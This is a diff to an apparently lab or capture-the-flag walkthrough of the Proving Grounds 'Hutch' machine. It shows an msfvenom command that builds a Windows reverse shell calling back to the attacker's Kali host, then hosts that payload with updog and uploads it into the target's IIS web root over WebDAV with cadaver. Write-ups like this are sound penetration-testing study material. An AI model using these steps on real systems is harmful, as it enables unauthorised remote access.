@@ -243,6 +243,20 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe"
 
+![](Pasted%20image%2020221019011410.png)
+
+#### -Typed "updog -p 80" on kali machine to host the reverse shell payload
+
+#### -Typed "put /home/brian/Downloads/Proving_Grounds/Hutch/reverse.exe" on the cadaver session to download the reverse shell to target machine:
+
+![](Pasted%20image%2020221019011613.png)
+
+
+
+#### -Typed "dir C:\inetpub\wwwroot\" to confirm the reverse shell payload was on the target machine
+
+![](Pasted%20image%2020221019011821.png)
+
 
 
 
